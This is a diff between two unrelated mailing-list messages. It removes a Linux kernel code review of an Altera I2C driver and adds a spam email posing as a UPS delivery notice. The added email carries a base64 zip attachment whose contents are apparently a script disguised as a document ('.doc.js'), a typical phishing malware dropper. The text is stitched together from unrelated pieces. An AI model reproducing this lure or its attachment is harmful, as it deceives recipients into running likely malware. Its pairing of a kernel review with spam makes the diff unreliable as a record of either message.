@@ -1,297 +1,64 @@
-From: Thor Thayer <thor.thayer-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>
-Subject: Re: [PATCHv4 3/3] i2c: altera: Add Altera I2C Controller driver
-Date: Fri, 7 Jul 2017 16:08:45 -0500
-Message-ID: <f049d174-5a64-2a20-5f47-1638963ea475@linux.intel.com>
-References: <1497904618-27010-1-git-send-email-thor.thayer@linux.intel.com>
- <1497904618-27010-4-git-send-email-thor.thayer@linux.intel.com>
- <CAHp75VcpdeGW0KXSqZwyMDkGbjT+6Ky5nBXTs7d-dN0gpYHV_w@mail.gmail.com>
-Reply-To: thor.thayer-VuQAYsv1563Yd54FQh9/CA@public.gmane.org
-Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Return-path: <devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <CAHp75VcpdeGW0KXSqZwyMDkGbjT+6Ky5nBXTs7d-dN0gpYHV_w-JsoAwUIsXosN+BqQ9rBEUg@public.gmane.org>
-Content-Language: en-US
-Sender: devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Andy Shevchenko <andy.shevchenko-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Cc: Wolfram Sang <wsa-z923LK4zBo2bacvFa/9K2g@public.gmane.org>, Rob Herring <robh+dt-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, Mark Rutland <mark.rutland-5wv7dgnIgG8@public.gmane.org>, "David S. Miller" <davem-fT/PcQaiUtIeIZ0/mPfg9Q@public.gmane.org>, Greg Kroah-Hartman <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org>, Mauro Carvalho Chehab <mchehab-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, linux-i2c <linux-i2c-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, devicetree <devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, linux-arm Mailing List <linux-arm-kernel-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org>
+From: CGI-Mailer <cgi-mailer@kundenserver.de>
+Subject: Parcel ID5571010 delivery problems, please review
+Date: Sat, 8 Jul 2017 04:54:40 +0200
+Message-ID: <0ZFzQi-1dpl8y1Woy-00vNhP@infong1202.kundenserver.de>
+Content-Type: multipart/mixed;
+        boundary="bound1_92323caafe2d6b5ff2d84578577ebc8c"
+Content-Transfer-Encoding: 8bit
+Return-path: <linux-i2c-owner@vger.kernel.org>
+Received: from mout.kundenserver.de ([212.227.126.134]:58594 "EHLO
+        mout.kundenserver.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1751812AbdGHCym (ORCPT
+        <rfc822;linux-i2c@vger.kernel.org>); Fri, 7 Jul 2017 22:54:42 -0400
+Sender: linux-i2c-owner@vger.kernel.org
 List-Id: linux-i2c@vger.kernel.org
+To: linux-i2c@vger.kernel.org
 
-Hi Andy,
+--bound1_92323caafe2d6b5ff2d84578577ebc8c
+Content-Type: text/plain; charset=us-ascii
 
-On 07/07/2017 11:25 AM, Andy Shevchenko wrote:
-> On Mon, Jun 19, 2017 at 11:36 PM,  <thor.thayer-VuQAYsv1563Yd54FQh9/CA@public.gmane.org> wrote:
-> 
-> Either...
->> +#include <linux/init.h>
-> 
-> ...or...
->> +#include <linux/module.h>
-> 
-> ...choose one.
-> 
->> +#define ALTR_I2C_THRESHOLD     0       /*IRQ Threshold at 1 element */
-> 
-> Space missed.
-> 
-Got it. Thanks!
+Dear Customer,
 
->> +/**
->> + * altr_i2c_empty_rx_fifo - Fetch data from RX FIFO until end of
->> + * transfer. Send a Stop bit on the last byte.
->> + */
->> +static void altr_i2c_empty_rx_fifo(struct altr_i2c_dev *idev)
->> +{
->> +       size_t rx_fifo_avail = readl(idev->base + ALTR_I2C_RX_FIFO_LVL);
->> +       int bytes_to_transfer = min(rx_fifo_avail, idev->msg_len);
->> +
-> 
->> +       while (bytes_to_transfer-- > 0) {
->> +               *idev->buf++ = readl(idev->base + ALTR_I2C_RX_DATA);
->> +               if (idev->msg_len == 1)
->> +                       altr_i2c_stop(idev);
->> +               else
->> +                       writel(0, idev->base + ALTR_I2C_TFR_CMD);
->> +
->> +               idev->msg_len--;
->> +       }
-> 
-> Move out invariant from the loop (and I see a bug, you might go over
-> boundaries).
-> 
->         while (bytes_to_transfer-- > 0) {
->                 *idev->buf++ = readl(idev->base + ALTR_I2C_RX_DATA);
->                 if (idev->msg_len-- == 1)
->                     break;
->                 writel(0, idev->base + ALTR_I2C_TFR_CMD);
->         }
-> 
->         altr_i2c_stop(idev);
-> 
-I see your point on the boundary. However your change is slightly 
-different from what I'm trying to do.
+UPS courier was unable to contact you for your parcel delivery.
 
-I think you assumed the alt_i2c_stop() call can cause a stop condition. 
-This soft IP can't send just a start or a stop condition by itself - 
-both of these conditions need to be paired with a byte.
+Postal label is enclosed to this e-mail. Please check the attachment!
 
-The other subtle side effect is the start condition + byte write is the 
-first write which is why the last write is skipped.
-
-I need to send a byte with a stop condition on the last expected byte 
-(idev->msg_len == 1) while this change would send it after the FIFO is 
-empty or after (msg_len == 1).
+Respectfully,
+ ,
+UPS Mail Delivery Agent.
 
 
-Your version is cleaner so I'll just add the alt_i2c_stop(idev) call 
-inside the (msg_len == 1) condition and before the break.
+--bound1_92323caafe2d6b5ff2d84578577ebc8c
+Content-Type: application/zip; name="UPS-Label-5571010.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Label-5571010.zip
 
->> +}
->> +
->> +/**
->> + * altr_i2c_fill_tx_fifo - Fill TX FIFO from current message buffer.
->> + * @return: Number of bytes left to transfer.
->> + */
->> +static int altr_i2c_fill_tx_fifo(struct altr_i2c_dev *idev)
->> +{
->> +       size_t tx_fifo_avail = idev->fifo_size - readl(idev->base +
->> +                                                      ALTR_I2C_TC_FIFO_LVL);
->> +       int bytes_to_transfer = min(tx_fifo_avail, idev->msg_len);
->> +       int ret = idev->msg_len - bytes_to_transfer;
->> +
->> +       while (bytes_to_transfer-- > 0) {
->> +               if (idev->msg_len == 1)
->> +                       writel(ALTR_I2C_TFR_CMD_STO | *idev->buf++,
->> +                              idev->base + ALTR_I2C_TFR_CMD);
->> +               else
->> +                       writel(*idev->buf++, idev->base + ALTR_I2C_TFR_CMD);
->> +               idev->msg_len--;
->> +       }
-> 
-> Ditto.
-> 
-See above but I will move the msg_len-- inside the condition check like 
-you had.
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAAAAVVBTLUxhYmVsLTU1NzEwMTAAAAAAAAAAAAAA
+AABQSwMEFAAAAAgAAAAAADNwAtdnBAAAvAYAACoAAABVUFMtTGFiZWwtNTU3MTAxMC9VUFMtTGFi
+ZWwtNTU3MTAxMC5kb2MuanNtVGlv4kgQ/cxI8x+8/jCYNRBfBNhRZtUYAuEImJuMRlFj2nbjox0f
+YBzlv0/bONmJtAjb3fXqdZWqXrURe3qEicd4xI3DCHJ+QCISxZXXAEVx4DHFvh4g34E64m4AuDGr
+LFv5/vb1ywkGTIpcm7ljykL+E0fg0r0c16vRMmyv1M3YMw+2JiW7iWaS/Xah9QSl2RAkQZg8PHQe
+juCxY9ovlo377bPQAVrvHoCpCrQWyHDVHNF1D0TDoSB2ds/9RU8bDkcvas2RlPNKkbd6cJRNpyWH
+WncEpGQzTbfErKnNHZbGR9AHg1V8DM/DibduKEsggBlebRq30tAx2yffimwVD6a7J/UxUUe9iT7X
+tmlwFKLGfKjpnmQt77uJ1RyFhr/vpQpxVyK0LiffCNTBvAHJ2u22GsNVeAG1neU/zmTYm63u27or
+tWV9LaSJCDc7owkmi7OvK0/j/WmxfZ5Im6arC4uX2TqRm7PG6mDrz83NKJmOcCIb+mDk9MX+U8vX
+doejdwrcZrsmrIdR1EYIJilq3E67EsQDEAShKDutdqpKSBjMJuqhv33qjGqhEnUmgZzagmbKyks3
+VI05AS/xcOmILgpT6XGBg7kfaw9doIHO+OleURE+GaPeWumlzt6Bg2d987yVmtEcNo9o0J+/AFuz
+Ir2lkOmzdHkYpkQam+b8CGeX4HZApCfXC3XBfNzczuZwMlRn5wXcYRmOz0L5+1UmQZzkMhEbotxU
+ZPEgGDJqylDay4LSFqUWaiiKIurv/h7ZI4cSqFJq9CmsCbX8ZGEETRgckFfXictW2b1DzLp8wR6M
+D5gUxvP5XA8tDEOL+IUpRMFBR1SwDq4HMTVgzyAhMaK677C/ihBHqJM9DeOhM0NrDC9ced5bzMBj
+ucqU+71l9pmsFg/dabYqVwpaPj0GpMSk7iDPjCw+S9p4n680dmKX87Edowrzmn/rIfIOXD5IH24u
+dC6hxVGXYv7e55K1IgDo32c/EwKcupCzj2aVcWxMeaWCSE310HdwxGX2TxwzQCj1yP9EKesk9mgc
+FJQ/UywKc2bs4D2MSFB5RSfo/LH/5GvjA7E5CwUxdj/ukeuWXiOhT7wQLVESZaSzhR3ERQGtytcv
+r1+/lLDB5a3/cVdUlNpLGVDaBwjatKQlSitFwSWzl0oZktXfcnO55F2jaZzQdro/Ij3iPgo4WWwB
+mIyl+nYyHiwBWM7YSta9K9+0LhHl/5Wl8p8RBU6m2uRnntOvHMgi1YmPPC6Xyk+5Jv2qMizLv/eO
+Z/+5uWH5nMyXb8r8R7358r9lPrswq3m8a/SrMrJT/8gmy6Wo4yfAxq6LdYuiZlTo7ANzsWHY8Aph
+74CSqcFlY1f5w8OJiY2pCwtZnmVzABsMxxXn8kKF+cFwLV7kxQrzNyMKAvPtGyMxd3QSs1URg2dk
+6idVmOyAvDvXtOOQvu8KUZpRNR/7Sv1IsMcVwa/ZlApBUf/C8NHevL/Zo8NItzj0LoC3DMz7wPN0
++fb9NzNwAtdnBAAAvAYAAFBLAQIAAAoAAAAAAAAAAAAAAAAAAAAAAAAAAAARAAAAAAAAAAAAEAAA
+AAAAAABVUFMtTGFiZWwtNTU3MTAxMFBLAQIAABQAAAAIAAAAAAAzcALXZwQAALwGAAAqAAAAAAAA
+AAAAIAAAADsAAABVUFMtTGFiZWwtNTU3MTAxMC9VUFMtTGFiZWwtNTU3MTAxMC5kb2MuanNQSwUG
+AAAAAAIAAgCXAAAA9gQAAAAA
 
->> +
->> +       return ret;
->> +}
-> 
->> +/**
->> + * altr_i2c_wait_for_core_idle - After TX, check core idle for all bytes TX.
->> + * @return: 0 on success or -ETIMEDOUT on timeout.
->> + */
->> +static int altr_i2c_wait_for_core_idle(struct altr_i2c_dev *idev)
->> +{
->> +       unsigned long timeout = jiffies + msecs_to_jiffies(ALTR_I2C_TIMEOUT);
->> +
->> +       do {
->> +               if (time_after(jiffies, timeout)) {
->> +                       dev_err(idev->dev, "Core Idle timeout\n");
->> +                       return -ETIMEDOUT;
->> +               }
->> +       } while (readl(idev->base + ALTR_I2C_STATUS) & ALTR_I2C_STAT_CORE);
->> +
->> +       return 0;
->> +}
-> 
-> readl_poll_timeout[_atomic]() please.
-> 
->> +static irqreturn_t altr_i2c_isr(int irq, void *_dev)
->> +{
->> +       struct altr_i2c_dev *idev = _dev;
-> 
->> +       /* Read IRQ status but only interested in Enabled IRQs. */
->> +       u32 status = readl(idev->base + ALTR_I2C_ISR) &
->> +                    readl(idev->base + ALTR_I2C_ISER);
-> 
-> Don't you have cached value for mask?
-> 
-Not right now, but it may be good to add that to the altr_i2c_dev structure.
 
->> +}
-> 
->> +
->> +static int altr_i2c_xfer_msg(struct altr_i2c_dev *idev, struct i2c_msg *msg)
->> +{
->> +       u32 int_mask = ALTR_I2C_ISR_RXOF | ALTR_I2C_ISR_ARB | ALTR_I2C_ISR_NACK;
-> 
->> +       u32 addr = (msg->addr << 1) & 0xFF;
-> 
-> i2c_8bit_addr_from_msg() ?
-> 
-Nice! I missed that function when writing this but I like it since it 
-also simplifies the code below.
-
->> +       unsigned long time_left;
->> +
-> 
->> +       if (i2c_m_rd(msg)) {
->> +               /* Dummy read to ensure RX FIFO is empty */
->> +               readl(idev->base + ALTR_I2C_RX_DATA);
->> +               addr |= ALTR_I2C_TFR_CMD_RW_D;
->> +       }
->> +
->> +       writel(ALTR_I2C_TFR_CMD_STA | addr, idev->base + ALTR_I2C_TFR_CMD);
->> +
->> +       if (i2c_m_rd(msg)) {
->> +               /* write the first byte to start the RX */
->> +               writel(0, idev->base + ALTR_I2C_TFR_CMD);
->> +               int_mask |= ALTR_I2C_ISER_RXOF_EN | ALTR_I2C_ISER_RXRDY_EN;
->> +       } else {
->> +               altr_i2c_fill_tx_fifo(idev);
->> +               int_mask |= ALTR_I2C_ISR_TXRDY;
->> +       }
-> 
-> It's hard to follow. Perhaps
-> 
-> if (read) {
->   ...do for read...
-> } else {
->   ...do for write...
-> }
-
-Will do. This will be much cleaner, especially with the 
-i2c_8bit_addr_from_msg() function you pointed out. Thanks!
-
-> 
->> +       if (readl(idev->base + ALTR_I2C_STATUS) & ALTR_I2C_STAT_CORE)
->> +               dev_err(idev->dev, "%s: Core Status not IDLE...\n", __func__);
-> 
-> Better to
-> 
-> val = readl();
-> if (val)
->   ...
-
-Got it. Thanks!
-> 
->> +static int
->> +altr_i2c_xfer(struct i2c_adapter *adap, struct i2c_msg msgs[], int num)
->> +{
-> 
-> Why [] ?!
-> 
->> +       struct altr_i2c_dev *idev = i2c_get_adapdata(adap);
-> 
->> +       int i;
->> +       int ret = 0;
->> +
->> +       for (i = 0; ret == 0 && i < num; ++i)
->> +               ret = altr_i2c_xfer_msg(idev, &msgs[i]);
->> +
->> +       return ret ? : i;
-> 
-> Oy vey...
-> Perhaps
-> 
-> static int altr_i2c_xfer(struct i2c_adapter *adap, struct i2c_msg
-> *msgs, int num)
-> {
->      struct altr_i2c_dev *idev = i2c_get_adapdata(adap);
->      int ret;
-> 
->      while (num--) {
->          ret = altr_i2c_xfer_msg(idev, msgs++);
->          if (ret)
->              return ret;
->      }
->      return 0;
-> }
-> 
-Yes, I just copied this from the axxia driver but I'll clean this up for 
-my re-write.
-
->> +static u32 altr_i2c_func(struct i2c_adapter *adap)
->> +{
->> +       return I2C_FUNC_I2C;
->> +}
-> 
-> Useless. Use value in place.
-
-Got it. Thanks!
-
-> 
->> +static int altr_i2c_probe(struct platform_device *pdev)
->> +{
->> +       struct device_node *np = pdev->dev.of_node;
->> +       struct altr_i2c_dev *idev = NULL;
->> +       struct resource *res;
->> +       int irq;
-> 
->> +       int ret = 0;
-> 
-> Redundant assignment.
-> 
->> +       if (of_property_read_u32(np, "fifo-size", &idev->fifo_size))
->> +               idev->fifo_size = ALTR_I2C_DFLT_FIFO_SZ;
-> 
-> Shouldn't be possible to auto detect?
-> 
-I agree. That would have been SO much better but the hardware designers 
-released this without capturing the size in a register - they come from 
-a bare-metal project perspective.  Since the FIFO size is configurable 
-in the FPGA from 4 to 256 levels deep, I need to capture this with the 
-device tree.
-
->> +       if (of_property_read_u32(np, "clock-frequency", &idev->bus_clk_rate)) {
-> 
-> device_property_*() ?
-
-OK. This is another function I wasn't aware of but I see the 
-i2c-designware-platdrv.c uses it too.
-
-IIUC, it seems like this falls back to the device tree if the device 
-properties aren't defined.
-
-> 
->> +               dev_err(&pdev->dev, "Default to 100kHz\n");
->> +               idev->bus_clk_rate = 100000;    /* default clock rate */
->> +       }
-> 
-Great comments! Thanks for reviewing!
-
---
-To unsubscribe from this list: send the line "unsubscribe devicetree" in
-the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-More majordomo info at  http://vger.kernel.org/majordomo-info.html
+--bound1_92323caafe2d6b5ff2d84578577ebc8c--
